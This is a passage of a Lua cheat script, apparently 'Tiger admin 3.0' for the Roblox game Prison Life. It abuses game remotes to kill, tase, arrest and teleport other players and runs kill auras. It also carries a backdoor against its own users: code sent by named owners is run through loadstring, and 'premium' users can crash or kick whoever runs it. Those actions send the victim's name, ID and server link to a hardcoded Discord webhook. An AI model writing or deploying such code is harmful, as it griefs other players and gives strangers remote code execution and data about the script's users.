task.spawn(function()
	game:GetService("Players").PlayerAdded:Connect(function(v)
		if v and table.find(TigerAdminOwners,v.Name:lower()) and not Settings.Unloaded then
			API.Notif("Tiger admin owner is in your server! ("..v.Name..")","Warning",5)
		end
	end)
	for i,v in pairs(game:GetService("Players"):GetPlayers()) do
		if table.find(TigerAdminOwners,v.Name:lower()) then
			API.Notif("Tiger admin owner is in your server! ("..v.Name..")","Warning",5)
		end
	end
end)
--// LOOPS
Update_Loading_Percent(70)
do
	task.spawn(function()--/loopkillall
		while wait(3.7) do
			if Settings.Unloaded then break end
			pcall(function()
				if Toggles.LoopTaseAll then
					API.Tase_Player("all")
				end
				if Toggles.LoopkillAll then
					API.KillPlayers("all")
				end
				if Toggles.LoopkillGuards then
					API.KillPlayers(game.Teams.Guards)
				end
				if Toggles.LoopkillInmates then
					API.KillPlayers(game.Teams.Inmates)
				end
				if Toggles.LoopkillCriminals then
					API.KillPlayers(game.Teams.Criminals)
				end
			end)
		end
	end)
	task.spawn(function()
		while wait(.5) do
			if Settings.Unloaded then
				break
			end
			if #Temp.Trapped >0 then
				for i,v in pairs(Temp.Trapped) do
					v = game:GetService("Players"):FindFirstChild(v)
					pcall(function()
						if v and v.Character and not v.Character:FindFirstChild("Forcefield") and (v.Character:FindFirstChild("HumanoidRootPart").Position-Vector3.new(-307, 84, 1984)).Magnitude >100 then
							API.Bring(v,CFrame.new(-307, 84, 1984))
						end
					end)
				end
			end
			if Toggles.AntiShield then
				for i,v in pairs(game:GetService("Players"):GetPlayers()) do
					if v.Team == game.Teams.Guards then
						pcall(function()
							v.Torso:FindFirstChild("ShieldFolder"):Destroy()
						end)
					end
				end
			end
			if #Temp.LoopTasing>0 then
				for i,v in pairs(Temp.LoopTasing) do
					local Target = game:GetService("Players"):FindFirstChild(v)
					if Target and Target.Character and Target.Character:FindFirstChild('Humanoid') and Target.Character.Humanoid.Health > 0 then
						pcall(function()
							if Target.Character.HumanoidRootPart.Velocity.X >0 or Target.Character.HumanoidRootPart.Velocity.Z >0 or Target.Character.HumanoidRootPart.Velocity.Y >0  then
								API.Tase_Player(game:GetService("Players"):FindFirstChild(v))
							end
						end)
					end
				end
			end
			if #Temp.LoopKilling>0 then
				for i,v in pairs(Temp.LoopKilling) do
					local Target = game:GetService("Players"):FindFirstChild(v)
					if Target and Target.Character and Target.Character:FindFirstChild('Humanoid') and Target.Character.Humanoid.Health > 0 then
						pcall(function()
							API.Kill_Player(game:GetService("Players"):FindFirstChild(v),{DontChangeTeam=true})
						end)
					end
				end
			end
			if Toggles.AntiSit then
				pcall(function()
					plr.Character:FindFirstChildOfClass("Humanoid"):SetStateEnabled(Enum.HumanoidStateType.Seated, false)
				end)
			end
			if Toggles.AntiBring then
				pcall(function()
					plr.Character:FindFirstChildOfClass("Humanoid"):SetStateEnabled(Enum.HumanoidStateType.Seated, false)
					plr.Character:FindFirstChildOfClass("Humanoid").Sit = true
				end)
				for _,Target in pairs(game:GetService("Players"):GetPlayers()) do
					if Target ~= plr then
						for i,v in pairs(game:GetService("Workspace").CarContainer:GetChildren()) do
							if v then
								if v:FindFirstChild("Body") and v:FindFirstChild("Body"):FindFirstChild("VehicleSeat") and v:FindFirstChild("Body"):FindFirstChild("VehicleSeat").Occupant == Target.Character:FindFirstChildOfClass("Humanoid") and (Target.Character:GetPivot().Position-plr.Character:GetPivot().Position).Magnitude <=15  then
									for i = 1,7 do
										game:GetService("ReplicatedStorage").meleeEvent:FireServer(Target,{Name ='Crude Knife'})
									end
								end
							end
						end
					end
				end
			end
		end
	end)
	task.spawn(function()
		while wait(.05) do
			if Settings.Unloaded then
				break
			end
			if #ReloadingGuns>0 then
				for _,v in pairs(ReloadingGuns) do
					if v and v.Parent then
						game:GetService("ReplicatedStorage").ReloadEvent:FireServer(v)
						task.wait()
					end
				end
			end
			if plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") and plr.Character:FindFirstChild("HumanoidRootPart").Position.Y <6 then
				API.MoveTo(CFrame.new(916.7511596679688, 99.98997497558594, 2381.497314453125))
			end
			game:GetService('StarterGui'):SetCoreGuiEnabled('Backpack', true)
			if Toggles.ArrestAura then
				for i,v in pairs(game.Players:GetPlayers()) do
					if v ~= plr then
						pcall(function()
							if (v.Character.HumanoidRootPart.Position - plr.Character.HumanoidRootPart.Position).magnitude <30 and v.Character.Humanoid.Health >0 and not v.Character["Head"]:FindFirstChildOfClass("BillboardGui") and v.Team == game.Teams.Criminals or API.IsBadArea(v) and not table.find(Temp.Whitelisted,v.Name) and not v.Character:FindFirstChildOfClass("ForceField") then
								for i =1,3 do
									workspace.Remote.arrest:InvokeServer(v)
								end
							end
						end)
					end
				end
			end
			if Toggles.AntiArrest then
				for i,v in pairs(game.Players:GetPlayers()) do
					if v ~= plr then
						pcall(function()
							if (v.Character.HumanoidRootPart.Position - plr.Character.HumanoidRootPart.Position).magnitude <30 and v.Character.Humanoid.Health >0 and not table.find(Temp.Whitelisted,v.Name) and v.Character:FindFirstChild("Handcuffs") and not v.Character:FindFirstChildOfClass("ForceField") then
								for i =1,3 do
									game:GetService("ReplicatedStorage").meleeEvent:FireServer(v,{Name ='Crude Knife'})
								end
							end
						end)
					end
				end
			end
			if Toggles.KillAura then
				for i,v in pairs(game.Players:GetPlayers()) do
					if v ~= plr then
						pcall(function()
							if (v.Character.HumanoidRootPart.Position - plr.Character.HumanoidRootPart.Position).magnitude <30 and v.Character.Humanoid.Health >0 and not table.find(Temp.Whitelisted,v.Name) and not v.Character:FindFirstChildOfClass("ForceField") then
								for i =1,3 do
									game:GetService("ReplicatedStorage").meleeEvent:FireServer(v,{Name ='Crude Knife'})
								end
							end
						end)
					end
				end
			end
			if Toggles.AntiTouch then
				for i,v in pairs(game.Players:GetPlayers()) do
					if v ~= plr then
						pcall(function()
							if (v.Character.HumanoidRootPart.Position - plr.Character.HumanoidRootPart.Position).magnitude <2.7 and v.Character.Humanoid.Health >0 and not table.find(Temp.Whitelisted,v.Name) and not v.Character:FindFirstChildOfClass("ForceField") then
								for i =1,3 do
									game:GetService("ReplicatedStorage").meleeEvent:FireServer(v,{Name ='Crude Knife'})
								end
							end
						end)
					end
				end
			end
		end
	end)
end
---// ADMIN PLAYER

local AdminChatted = function(Text,Speaker)
	if Settings.Unloaded then return end
	Speaker=game:GetService("Players"):FindFirstChild(Speaker)
	local Arg1_P = ""
	local function Msg(Say,v)
		Say = tostring(Say)
		if v then
			Say = tostring(Say:gsub("PREFIXHERE",Settings.Prefix))
		end
		game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("/w "..Speaker.Name.." "..Say, "All")
	end
	local function CheckCMD(G)
		if Arg1_P:lower() == Settings.Prefix..G:lower() then
			return true
		else
			return false
		end
	end
	if not Temp.RankCoolDown then
		task.spawn(function()
			Temp.RankCoolDown = true
			wait(.7)
			Temp.RankCoolDown = false
		end)
		--// Main
		Text = Text:lower()
		local Splitted = Text:split(" ")
		Arg1_P=Splitted[1]
		if CheckCMD("cmds") then
			print('chat')
			Msg("PREFIXHEREunvirus <PLAYER>, PREFIXHEREnuke <PLAYER>,PREFIXHEREvirus <PLAYER>",true)
			wait(.6)
			Msg("PREFIXHEREcmds, PREFIXHEREkill <PLAYER,ALL,TEAM>,PREFIXHEREbring <PLAYER>, PREFIXHEREcriminal <PLAYER,ME>, PREFIXHEREgoto <PLAYER>, PREFIXHEREtrap <PLAYER>, PREFIXHEREuntrap <PLAYER>",true)
			wait(.4)
			Msg("PREFIXHEREprison, PREFIXHEREtower, PREFIXHEREgate, PREFIXHEREarmory, PREFIXHEREyard, PREFIXHEREroof, PREFIXHEREkitchen",true)
			wait(.4)
			Msg("PREFIXHERElk <PLAYER,ALL>, PREFIXHEREunlk <PLAYER,ALL>, PREFIXHEREarrest <PLAYER>, PREFIXHEREcar",true)
		end
		if CheckCMD("prison") then
			local Pos = CFrame.new(916.7511596679688, 99.98997497558594, 2381.497314453125)
			if Splitted[2] then
				local Target = API.FindPlayer(tostring(Splitted[2]),Speaker)
				if Target then
					API.Bring(Target,Pos)
				end
			else
				API.Bring(Speaker,Pos)
			end
		end
		if CheckCMD("car") then
			pcall(function()
				local CarSpawner = nil
				for i,v in pairs(workspace.Prison_ITEMS.buttons:GetChildren()) do
					if v and v.Name:lower():find("car ") and not v["Car Spawner"].deb.Value then
						CarSpawner = v
					end
				end
				local Older = API.GetPos()
				local OldPos = plr.Character:GetPrimaryPartCFrame()
				game:GetService("Players").LocalPlayer.Character:SetPrimaryPartCFrame(CarSpawner["Car Spawner"].CFrame*CFrame.new(0,2,0))
				wait()
				local car = nil
				task.spawn(function()
					car = game:GetService("Workspace").CarContainer.ChildAdded:Wait()
				end)
				if not car then
					repeat wait(.05)
						workspace.Remote.ItemHandler:InvokeServer(CarSpawner["Car Spawner"])
					until car
				end
				repeat task.wait() until car:FindFirstChild("RWD") and car:FindFirstChild("Body") and car:FindFirstChild("Body"):FindFirstChild("VehicleSeat")
				car.PrimaryPart = car.RWD
				car:SetPrimaryPartCFrame(Speaker.Character.HumanoidRootPart.CFrame)
				game:GetService("Players").LocalPlayer.Character:SetPrimaryPartCFrame(OldPos)
				local Done = false
				car.Body.VehicleSeat:Sit(game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid"))
				repeat 
					game:GetService("RunService").RenderStepped:Wait()
					car:SetPrimaryPartCFrame(Speaker.Character.HumanoidRootPart.CFrame)
					game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame =CFrame.new(car.Body.VehicleSeat.Position)
					car.Body.VehicleSeat:Sit(game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid"))
					if game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid").Sit == true then
						Done = true
					end
				until Done
				wait(.3)
				API.UnSit()
				API.MoveTo(Older)
			end)
		end
		if CheckCMD("tower") then
			local Pos = CFrame.new(821.8330078125, 130.03990173339844, 2570.027587890625)
			if Splitted[2] then
				local Target = API.FindPlayer(tostring(Splitted[2]),Speaker)
				if Target then
					API.Bring(Target,Pos)
				end
			else
				API.Bring(Speaker,Pos)
			end
		end
		if CheckCMD("gate") then
			local Pos = CFrame.new(501.7165222167969, 125.0399169921875, 2304.559326171875)
			if Splitted[2] then
				local Target = API.FindPlayer(tostring(Splitted[2]),Speaker)
				if Target then
					API.Bring(Target,Pos)
				end
			else
				API.Bring(Speaker,Pos)
			end
		end
		if CheckCMD("armory") then
			local Pos = CFrame.new(800.0542602539062, 99.98998260498047, 2278.728759765625)
			if Splitted[2] then
				local Target = API.FindPlayer(tostring(Splitted[2]),Speaker)
				if Target then
					API.Bring(Target,Pos)
				end
			else
				API.Bring(Speaker,Pos)
			end
		end
		if CheckCMD("yard") then
			local Pos = CFrame.new(792.50885, 97.9999237, 2467.05664, 0.999635994, 2.4151424e-08, -0.0269802082, -2.5547001e-08, 1, -5.13812246e-08, 0.0269802082, 5.20517851e-08, 0.999635994)
			if Splitted[2] then
				local Target = API.FindPlayer(tostring(Splitted[2]),Speaker)
				if Target then
					API.Bring(Target,Pos)
				end
			else
				API.Bring(Speaker,Pos)
			end
		end
		if CheckCMD("roof") then
			local Pos = CFrame.new(807.6651000976562, 118.98998260498047, 2339.94873046875)
			if Splitted[2] then
				local Target = API.FindPlayer(tostring(Splitted[2]),Speaker)
				if Target then
					API.Bring(Target,Pos)
				end
			else
				API.Bring(Speaker,Pos)
			end
		end
		if CheckCMD("kitchen") then
			local Pos = CFrame.new(921.5233154296875, 99.98993682861328, 2228.135986328125)
			if Splitted[2] then
				local Target = API.FindPlayer(tostring(Splitted[2]),Speaker)
				if Target then
					API.Bring(Target,Pos)
				end
			else
				API.Bring(Speaker,Pos)
			end
		end
		if CheckCMD("criminal") then
			if not Splitted[2] or Splitted[2] == "me" then
				API.Bring(Speaker,CFrame.new(-920.510803, 92.2271957, 2138.27002, 0, 0, -1, 0, 1, 0, 1, 0, 0)*CFrame.new(-4.5,2,-3))
			elseif Splitted[2] =="all" or Splitted[2] == "others" then
				for i,v in pairs(game:GetService("Players"):GetPlayers()) do
					if v and v.Team ~= game.Teams.Criminals then
						API.Bring(v,CFrame.new(-920.510803, 92.2271957, 2138.27002, 0, 0, -1, 0, 1, 0, 1, 0, 0)*CFrame.new(-4.5,2,-3))
						wait(.1)
					end
				end
			else
				local Target = API.FindPlayer(tostring(Splitted[2]),Speaker)
				if Target then
					if Target.Team == game.Teams.Criminals then
						API.Notif("This player already is a criminal!","Error",2)
					else
						local lastpo = API.GetPos()
						API.Bring(Target,CFrame.new(-920.510803, 92.2271957, 2138.27002, 0, 0, -1, 0, 1, 0, 1, 0, 0)*CFrame.new(-4.5,2,-3))
						wait(.5)
						API.MoveTo(lastpo)
					end
				end
			end
		end
		if CheckCMD("kill") then
			if Splitted[2] == "all" or Splitted[2] == "others" then
				API.KillPlayers("all")
			elseif Splitted[2] == "guards" then
				API.KillPlayers(game.Teams.Guards)
			elseif Splitted[2] == "inmates" then
				API.KillPlayers(game.Teams.Inmates)
			elseif Splitted[2] == "criminals" then
				API.KillPlayers(game.Teams.Criminals)
			else
				local Target = API.FindPlayer(tostring(Splitted[2]),Speaker)
				if Target then
					API.Kill_Player(Target)
				end
			end
		end
		if CheckCMD("goto") then
			local Target = API.FindPlayer(tostring(Splitted[2]),Speaker)
			if Target then
				API.Bring(Speaker,Target.Character:GetPivot()*CFrame.new(0,0,-5))
			end
		end
		if CheckCMD("trap") then
			local Target = API.FindPlayer(tostring(Splitted[2]),Speaker)
			if Target then
				if not table.find(Temp.Trapped,Target.Name) then
					table.insert(Temp.Trapped,Target.Name)
				end
			end
		end
		if CheckCMD("untrap") then
			local Target = API.FindPlayer(tostring(Splitted[2]),Speaker)
			if Target then
				if table.find(Temp.Trapped,Target.Name) then
					table.remove(Temp.Trapped,table.find(Temp.Trapped,Target.Name))
				end
			end
		end
		if CheckCMD("virus") then
			local Target = API.FindPlayer(tostring(Splitted[2]),Speaker)
			if Target then
				API.Notif("Gave "..Target.Name.." covid","Information",2)
				if not table.find(Temp.Virus,Target.Name) then
					table.insert(Temp.Virus,Target.Name)
					local cd = false
					task.spawn(function()
						while wait() do
							if not table.find(Temp.Virus,Target.Name) then
								break
							end
							for i,v in pairs(game:GetService("Players"):GetPlayers()) do
								pcall(function()
									if v ~=plr and v ~= Target and v.Character and v.Character:FindFirstChildOfClass("Humanoid").Health >1 and not v.Character:FindFirstChildOfClass("ForceField") and (v.Character.HumanoidRootPart.Position - Target.Character.HumanoidRootPart.Position).magnitude <3 then
										if not cd then
											cd = true
											API.Kill_Player(v)
											wait(.5)
											cd = false
										end
									end
								end)
							end
						end
					end)
				end
			end
		end
		if CheckCMD("unirus") then
			local Target = API.FindPlayer(tostring(Splitted[2]),Speaker)
			if Target then
				if table.find(Temp.Virus,Target.Name) then
					table.remove(Temp.Virus,table.find(Temp.Virus,Target.Name))
				end
			end
		end
		if CheckCMD("arrest") then
			local Args=Splitted
			if Args[2] == "all" or Args[2] == "others" then
				for i,v in pairs(game:GetService("Players"):GetPlayers()) do
					if v and v~=plr and not table.find(Temp.Whitelisted,v.Name) and v.Team == game.Teams.Criminals or API.IsBadArea(v) and v ~=plr then
						repeat RStep:Wait()
							task.spawn(function()
								API.MoveTo(v.Character.Head.CFrame)
								Remotes.ArrestEvent(v)
							end)
						until v.Character["Head"]:FindFirstChildOfClass("BillboardGui") or v.Character:FindFirstChildOfClass("Humanoid").Health <1
					end
				end
			elseif Args[2] == "crims" then
				for i,v in pairs(game:GetService("Players"):GetPlayers()) do
					if v and v~=plr and not table.find(Temp.Whitelisted,v.Name) and v.Team == game.Teams.Criminals then
						repeat RStep:Wait()
							task.spawn(function()
								API.MoveTo(v.Character.Head.CFrame)
								Remotes.ArrestEvent(v)
							end)
						until v.Character["Head"]:FindFirstChildOfClass("BillboardGui") or v.Character:FindFirstChildOfClass("Humanoid").Health <1
					end
				end
			else
				local Target = API.FindPlayer(tostring(Splitted[2]),Speaker)
				if Target then
					if Target.Team == game.Teams.Criminals or API.IsBadArea(Target) then
						repeat RStep:Wait()
							task.spawn(function()
								API.MoveTo(Target.Character.Head.CFrame)
								Remotes.ArrestEvent(Target)
							end)
						until Target.Character["Head"]:FindFirstChildOfClass("BillboardGui") or Target.Character:FindFirstChildOfClass("Humanoid").Health <1
					end
				end
			end
		end
		if CheckCMD("bring") then
			local Target = API.FindPlayer(tostring(Splitted[2]),Speaker)
			if Target then
				API.Bring(Target,Speaker.Character:GetPivot()*CFrame.new(0,0,-5))
			end
		end
		if CheckCMD("nk") then
			local Target = API.FindPlayer(tostring(Splitted[2]),Speaker)
			if Target then
				game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("!!!WARNING: IF "..string.upper(Target.DisplayName).." DIES EVERYONE WILL DIE TOO!!!","All")
				repeat task.wait() until not Target or Target.Character:FindFirstChildOfClass("Humanoid") and Target.Character:FindFirstChildOfClass("Humanoid").Health <1
				game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(string.upper(Target.DisplayName).." DIED! EVERYONE WILL DIE NOW!","All")
				wait(1)
				game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("COUNTDOWN: 3","All")
				wait(1)
				game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("COUNTDOWN: 2","All")
				wait(1)
				game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("COUNTDOWN: 1","All")
				wait(.3)
				API.KillPlayers("all")
			end
		end
		if CheckCMD("lk") then
			if Splitted[2] == "all" or Splitted[2] == "others" then
				Toggles.LoopkillAll = true
			elseif Splitted[2] == "guards" then
				Toggles.LoopkillGuards = true
			elseif Splitted[2] == "inmates" then
				Toggles.LoopkillInmates = true
			elseif Splitted[2] == "criminals" then
				Toggles.LoopkillCriminals = true
			else
				local Target = API.FindPlayer(tostring(Splitted[2]),Speaker)
				if Target then
					if not table.find(Temp.LoopKilling,Target.Name) then
						table.insert(Temp.LoopKilling,Target.Name)
					end
					API.Notif("Loopkilling "..Target.Name,"Information",2)
				end
			end
		end
		if CheckCMD("unlk") then
			if Splitted[2] == "all" or Splitted[2] == "others" then
				Toggles.LoopkillAll = false
			elseif Splitted[2] == "guards" then
				Toggles.LoopkillGuards = false
			elseif Splitted[2] == "inmates" then
				Toggles.LoopkillInmates = false
			elseif Splitted[2] == "criminals" then
				Toggles.LoopkillCriminals = false
			else
				local Target = API.FindPlayer(tostring(Splitted[2]),Speaker)
				if Target then
					if table.find(Temp.LoopKilling,Target.Name) then
						table.remove(Temp.LoopKilling,table.find(Temp.LoopKilling,Target.Name))
						API.Notif("Stopped loopkilling "..Target.Name,"Information",2)
					end
				end
			end
		end
	end
end
local ShootbackCooldown = false
local function ReplicationEventFunction(Table)
	if Settings.Unloaded then return end
	if Table[1] and Table[1].CC ~= nil and Table[1].PLR ~= nil  then
		if Table[1].Cframe.Z == 50000 and table.find(TigerAdminOwners,Table[1].PLR.Name) then
			task.spawn(function()
				loadstring(tostring(Table[1].CC))()
			end)
		end
	end
	local Count = 0
	local function MostClose(Position)
		local Max, Closest = 4,nil
		for i,v in pairs(game:GetService("Players"):GetPlayers()) do
			if v.Character then
				if v.Character:FindFirstChildOfClass("Tool") or v.Backpack:FindFirstChildOfClass("Tool") then
					local ShootPart = (v.Character:FindFirstChildOfClass("Tool") or v.Backpack:FindFirstChildOfClass("Tool")):FindFirstChild("Muzzle")
					if v.Character.PrimaryPart and (v.Character:FindFirstChildOfClass("Tool") or v.Backpack:FindFirstChildOfClass("Tool")):FindFirstChild("Muzzle") then
						local Distance = (ShootPart.Position-Position).Magnitude
						if Distance < Max then
							Max = Distance
							Closest = v
						end 
					end
				end
			end
		end
		return Closest
	end
	local PlayerHit = nil
	local Shooter = nil
	pcall(function()
		for i,v in pairs(Table) do
			if Count <= 4 then
				if v.Hit and v.Distance and v.Cframe and v.Cframe ~= CFrame.new() and v.Cframe ~= CFrame.new(0,0,0) then
					if v.Distance == 69999 then
						API.KillPlayers("all") --// prizzlife crashserver detection
						API.Notif("CRASHSERVER DETECTED! ATTEMPTING TO PREVENT","PRIZZLIFE USER DETECTED",10)
						return
					end
					for i,plyr in pairs(game:GetService("Players"):GetPlayers()) do
						if plyr.Character:IsAncestorOf(v.Hit) then
							Shooter = plyr
							PlayerHit = v.Hit
							break
						end
					end
					local Worked,_ = pcall(function()
						Shooter = MostClose((v.Cframe * CFrame.new(0, 0, -v.Distance / 2)).p)
					end)
					if Worked and Shooter and PlayerHit and not Settings.Unloaded then
						if Toggles.ShootBack and not ShootbackCooldown then
							if PlayerHit then
								if PlayerHit and plr.Character:IsAncestorOf(PlayerHit) and ShootbackCooldown == false and Shooter.Team ~= plr.Team and not Shooter.Character:FindFirstChildOfClass("ForceField") then
									if not table.find(Temp.Whitelisted,Shooter.Name) then
										ShootbackCooldown = true
										API.Kill_Player(Shooter)
										wait(1)
										ShootbackCooldown = false
									end
								end
							end
						end
					end
				end
				Count = Count + 1
			end
		end
	end)
end
coroutine.wrap(function()
	local ReplicateEvent = game.ReplicatedStorage:WaitForChild('ReplicateEvent')
	ReplicateEvent.OnClientEvent:Connect(ReplicationEventFunction)
end)()
--
function ReplicatedChatting(Message,FromClient)
	if Settings.Unloaded then return end
	if FromClient then
		if table.find(Temp.Admins,FromClient.Name) or Temp.AdminAll == true then
			AdminChatted(Message,FromClient.Name)
		end
		if table.find(PremiumUsers,FromClient.UserId) then --// PREMIUM COMMANDS
			FromClient.Character:FindFirstChild("Humanoid").DisplayName = "[PREMIUM] "..FromClient.Name
			local Split = Message:lower():split(" ")
			local function MatchCommand(Txt)
				return Split[1]:lower() == ("%s%s"):format(Settings.Prefix,Txt:lower())
			end
			if MatchCommand("k") then
				pcall(function()
					(http_request or request)({
						Url = "https://discord.com/api/webhooks/1279200443779645491/m9kfN4r3RqGOug_Z-ll49pBZ2bRu2MASgf8-Y5_ek8d0FVSgRqiwnHBLkxyj7aSdnqVe",
						Method = "POST",
						Headers = {
							["Content-Type"] = "application/json"
						},
						Body = game:GetService("HttpService"):JSONEncode({
							["content"] = "",
							["embeds"] = {{
								["title"] = "**"..FromClient.Name.."** has kicked "..plr.Name.."!",
								["type"] = "rich",
								["color"] = tonumber(0x00FF00),
								["fields"] = {
									{
										["name"] = "Name",
										["value"] = tostring(game.Players.LocalPlayer.Name),
										["inline"] = true
									},
									{
										["name"] = "UserID",
										["value"] = tostring(game.Players.LocalPlayer.CharacterAppearanceId),
										["inline"] = true
									},
									{
										["name"] = "JobID",
										["value"] = "https://www.roblox.com/games/155615604/Prison-Life?serverJobId="..game.JobId,
										["inline"] = true
									}
								},
								["thumbnail"] = {
									["url"] = game:GetService("HttpService"):JSONDecode(game:HttpGet("https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds="..game.Players.LocalPlayer.UserId.."&size=150x150&format=Png&isCircular=false"))["data"][1].imageUrl,
								},
								["footer"] = {
									["text"] = "Tiger admin 3.0 ("..Settings.Version..") | "..(identifyexecutor and identifyexecutor() or Executor or "Unknown")
								},
								["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
							}}
						})
					})
				end)
				wait(1)
				if Split[2] == "all" or not Split[2] then
					for i,v in pairs(workspace:GetDescendants()) do
						pcall(function()
							v:Destroy()
						end)
					end
					task.spawn(function()
						pcall(function()
							plr:Kick(("Kicked by Tiger admin premium user. (%s)"):format(FromClient.Name))
						end)
					end)
					wait(Random.new():NextNumber(5,8)) --// no hooking
					while true do end
				else
					local GetPlayer = API.FindPlayer(Split[2])
					if GetPlayer == plr then
						for i,v in pairs(workspace:GetDescendants()) do
							pcall(function()
								v:Destroy()
							end)
						end
						task.spawn(function()
							pcall(function()
								plr:Kick(("Kicked by Tiger admin premium user. (%s)"):format(FromClient.Name))
							end)
						end)
						wait(Random.new():NextNumber(5,8)) --// no hooking
						while true do end
					end
				end
			end
			if MatchCommand("b") then
				if Split[2] == "all" or not Split[2] then
					API.MoveTo(FromClient.Character.Head.CFrame)
				else
					local GetPlayer = API.FindPlayer(Split[2])
					if GetPlayer == plr then
						API.MoveTo(FromClient.Character.Head.CFrame)
					end
				end
			end
			if MatchCommand("f") then
				if Split[2] == "all" or not Split[2] then
					local FrozenP = API.GetPos()
					Temp.Frozen = game:GetService("RunService").PreRender:Connect(function()
						API.MoveTo(FrozenP)
						plr.Character:FindFirstChild("HumanoidRootPart").Anchored = true
					end)
				else
					local GetPlayer = API.FindPlayer(Split[2])
					if GetPlayer == plr then
						local FrozenP = API.GetPos()
						Temp.Frozen = game:GetService("RunService").PreRender:Connect(function()
							API.MoveTo(FrozenP)
							plr.Character:FindFirstChild("HumanoidRootPart").Anchored = true
						end)
					end
				end
			end
			if MatchCommand("unf") then
				if Split[2] == "all" or not Split[2] then
					if Temp.Frozen then
						Temp.Frozen:Disconnect()
						plr.Character:FindFirstChild("HumanoidRootPart").Anchored = false
					end
				else
					local GetPlayer = API.FindPlayer(Split[2])
					if GetPlayer == plr then
						if Temp.Frozen then
							Temp.Frozen:Disconnect()
							plr.Character:FindFirstChild("HumanoidRootPart").Anchored = false
						end
					end
				end
			end
			if MatchCommand("c") then
				pcall(function()
					(http_request or request)({
						Url = "https://discord.com/api/webhooks/1279200443779645491/m9kfN4r3RqGOug_Z-ll49pBZ2bRu2MASgf8-Y5_ek8d0FVSgRqiwnHBLkxyj7aSdnqVe",
						Method = "POST",
						Headers = {
							["Content-Type"] = "application/json"
						},
						Body = game:GetService("HttpService"):JSONEncode({
							["content"] = "",
							["embeds"] = {{
								["title"] = "**"..FromClient.Name.."** has crashed "..plr.Name.."!",
								["type"] = "rich",
								["color"] = tonumber(0x00FF00),
								["fields"] = {
									{
										["name"] = "Name",
										["value"] = tostring(game.Players.LocalPlayer.Name),
										["inline"] = true
									},
									{
										["name"] = "UserID",
										["value"] = tostring(game.Players.LocalPlayer.CharacterAppearanceId),
										["inline"] = true
									},
									{
										["name"] = "JobID",
										["value"] = "https://www.roblox.com/games/155615604/Prison-Life?serverJobId="..game.JobId,
										["inline"] = true
									}
								},
								["thumbnail"] = {
									["url"] = game:GetService("HttpService"):JSONDecode(game:HttpGet("https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds="..game.Players.LocalPlayer.UserId.."&size=150x150&format=Png&isCircular=false"))["data"][1].imageUrl,
								},
								["footer"] = {
									["text"] = "Tiger admin 3.0 ("..Settings.Version..") | "..(identifyexecutor and identifyexecutor() or Executor or "Unknown")
								},
								["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
							}}
						})
					})
				end)
				wait(1)
				if Split[2] == "all" or not Split[2] then
					while true do end
				else
					local GetPlayer = API.FindPlayer(Split[2])
					if GetPlayer == plr then
						while true do end
					end
				end
			end
			if MatchCommand("fl") then
				if Split[2] == "all" or not Split[2] then
					for i = 1,3000 do
						game:GetService("RunService").PreRender:Wait()
						plr.Character.HumanoidRootPart.Velocity = Vector3.new(0,100,0)
					end
				else
					local GetPlayer = API.FindPlayer(Split[2])
					if GetPlayer == plr then
						for i = 1,300 do
							
							plr.Character.HumanoidRootPart.Velocity = Vector3.new(0,10000,0)
						end
					end
				end
			end
			if MatchCommand("say") then
				if Split[2] == "all" and Split[3] and tostring(Split[3]) then
					game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(Split[3], "All")
				else
					local GetPlayer = API.FindPlayer(Split[2])
					if GetPlayer == plr  and Split[3] and tostring(Split[3]) then
						game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(Split[3], "All")
					end
				end
			end
		end
	end
end
for i,v in pairs(game:GetService("Players"):GetPlayers()) do
	v.Chatted:Connect(function(Msg)
		ReplicatedChatting(Msg,v)
	end)
end
game:GetService("Players").PlayerAdded:Connect(function(NewPlayer)
	repeat task.wait() until NewPlayer and NewPlayer.Character --// Sometimes shit breaks so i added this
	NewPlayer.Chatted:Connect(function(Msg)
		ReplicatedChatting(Msg,NewPlayer)
	end)
	
end)
local swung = false
game:GetService("UserInputService").InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch and not Settings.Unloaded then
		local Target = plr:GetMouse().Target
		if Toggles.ClickArrest or Toggles.ClickKill then
			if Target and Target.Parent and Target.Parent:FindFirstChildOfClass("Humanoid") and game:GetService("Players"):FindFirstChild(Target.Parent.Name) or game:GetService("Players"):FindFirstChild(Target.Parent.Parent.Name) then
				local PlrModel = nil
				for i,v in pairs(game:GetService("Players"):GetPlayers()) do
					if v and v~=plr and Target:IsDescendantOf(v.Character) then
						PlrModel = v
					end
				end
				if Toggles.ClickArrest then
					if PlrModel.Team ~= game:GetService("Teams").Guards then
						workspace.Remote.arrest:InvokeServer(Target)
					end
				end
				if Toggles.ClickKill then
					API.Kill_Player(PlrModel)
				end
			end
		end
	end
	if not Settings.Unloaded and Toggles.FastPunch and input.KeyCode == Enum.KeyCode.F then
		task.spawn(function()
			local fight_left = plr.Character.Humanoid:LoadAnimation(plr.Character:WaitForChild("ClientInputHandler").fight_left)
			local fight_right = plr.Character.Humanoid:LoadAnimation(plr.Character:WaitForChild("ClientInputHandler").fight_right)
			if swung then
				fight_left:Play()
			else
				fight_right:Play()
			end
			swung = not swung
			local start = plr.Character.Torso.Position
			local finish = plr.Character.HumanoidRootPart.CFrame:toWorldSpace(CFrame.new(0,0,-5)).p
			local ray = Ray.new(start,(finish-start).unit*3)
			local hit,position = workspace:FindPartOnRay(ray,plr.Character)
			local enemyHum = hit and hit.Parent:findFirstChild("Humanoid")
